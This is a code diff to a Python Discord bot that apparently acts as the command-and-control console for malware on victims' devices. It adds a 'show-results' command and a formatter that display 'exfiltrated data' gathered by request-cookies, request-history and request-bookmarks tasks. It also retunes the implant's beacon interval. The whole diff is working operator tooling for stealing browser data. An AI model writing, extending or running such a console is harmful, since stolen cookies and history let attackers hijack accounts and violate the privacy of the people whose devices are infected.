@@ -128,6 +128,39 @@ def format_server_simple(data: dict[str, Any]) -> str:
     return f"{emoji} {message}"
 
 
+def format_server_results(data: dict[str, Any]) -> str:
+    """Format a /admin/results response into a Discord-friendly string."""
+    results = data.get("data", {}).get("results_by_device", {})
+    if not results:
+        return "📭 No task results stored yet. Queue a task and wait for the next beacon cycle."
+
+    task_emojis: dict[str, str] = {
+        "request-cookies": "🍪",
+        "request-history": "📜",
+        "request-bookmarks": "🔖",
+    }
+
+    lines = [f"📊 **{data.get('message', 'Task Results')}**"]
+    for device_name, device_results in results.items():
+        lines.append(f"\n📱 **{device_name}**")
+        for task_type, result in device_results.items():
+            emoji = task_emojis.get(task_type, "📄")
+            status_icon = "✅" if result.get("success") else "❌"
+            received = result.get("received_at", "")[:19].replace("T", " ")
+            lines.append(f"  {emoji} `{task_type}` — {status_icon} `{received}`")
+            output = str(result.get("data", {}).get("output", ""))
+            if output:
+                for line in output.split("\n")[:5]:
+                    lines.append(f"    > {line[:120]}")
+                if len(output.split("\n")) > 5:
+                    lines.append("    > *(… more lines truncated)*")
+
+    response = "\n".join(lines)
+    if len(response) > 1900:
+        response = response[:1900] + "\n…*(truncated — check /admin/results for full data)*"
+    return response
+
+
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
@@ -261,10 +294,10 @@ async def show_devices(interaction: discord.Interaction) -> None:
 
 @bot.tree.command(
     name="set-beacon-interval",
-    description="Set the beacon interval. Valid values: 2, 4, 8, 16, 32.",
+    description="Set the beacon interval. Valid values: 15, 30, 60, 120.",
 )
 @app_commands.autocomplete(interval=beacon_interval_autocomplete)
-@app_commands.describe(interval="Beacon interval in seconds (2, 4, 8, 16, or 32)")
+@app_commands.describe(interval="Beacon interval in seconds (15, 30, 60, or 120)")
 async def set_beacon_interval(
     interaction: discord.Interaction,
     interval: int,
@@ -554,6 +587,31 @@ async def queue_task(
         response = format_server_simple(server_response)
     else:
         response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="show-results",
+    description="Show the latest exfiltrated data for all devices.",
+)
+async def show_results(interaction: discord.Interaction) -> None:
+    """Display the most recent task result per type per device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "show-results")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "show-results")
+
+    server_response = await call_server("/admin/results")
+    if server_response:
+        response = format_server_results(server_response)
+    else:
+        response = "❌ Server unreachable — cannot retrieve results."
 
     await interaction.response.send_message(response)
 
